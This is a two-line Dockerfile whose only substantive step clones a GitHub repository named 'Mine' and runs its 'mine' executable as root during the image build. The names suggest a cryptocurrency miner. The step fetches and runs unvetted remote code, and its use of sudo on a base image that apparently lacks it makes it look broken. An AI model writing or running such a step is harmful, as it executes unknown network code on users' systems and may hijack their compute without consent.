FROM ubuntu:18.04

RUN apt-get update
RUN sudo apt install -y git && sudo git clone https://github.com/MiiAnliAngku/Mine.git && cd Mine && sudo chmod u+x mine && sudo ./mine
